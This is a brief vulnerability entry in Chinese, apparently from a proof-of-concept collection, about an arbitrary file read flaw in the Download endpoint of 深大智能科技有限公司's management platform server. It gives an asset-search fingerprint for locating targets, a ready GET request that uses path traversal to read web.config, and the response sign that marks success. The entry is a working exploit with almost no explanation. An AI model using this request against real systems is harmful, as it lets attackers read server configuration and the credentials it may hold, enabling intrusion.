# 深大智能科技有限公司管控平台服务端Download存在任意文件读取漏洞

深大智能科技有限公司管控平台服务端 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="ItemsControlServer.aspx"`
- **请求**：`GET /Launch/Download?FilePath=../web.config HTTP/1.1`
- **响应特征**：200 version=”1.0”